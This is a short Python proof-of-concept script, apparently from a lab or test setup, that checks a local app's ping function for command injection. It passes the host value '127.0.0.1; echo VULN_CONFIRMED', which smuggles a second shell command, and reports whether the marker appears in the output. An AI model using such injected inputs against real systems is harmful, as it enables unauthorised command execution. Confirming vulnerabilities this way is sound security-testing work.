"""验证 /ping 的命令注入。成功时输出 VULN_CONFIRMED。"""

from __future__ import annotations

import os
import sys

SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, SRC_DIR)

import app  # noqa: E402


def main() -> int:
    result = app.ping_host("127.0.0.1; echo VULN_CONFIRMED")
    output = result.get("output", "")
    print(f"output={output}")
    if "VULN_CONFIRMED" in output:
        print("VULN_CONFIRMED")
        return 0
    print("command injection not confirmed")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
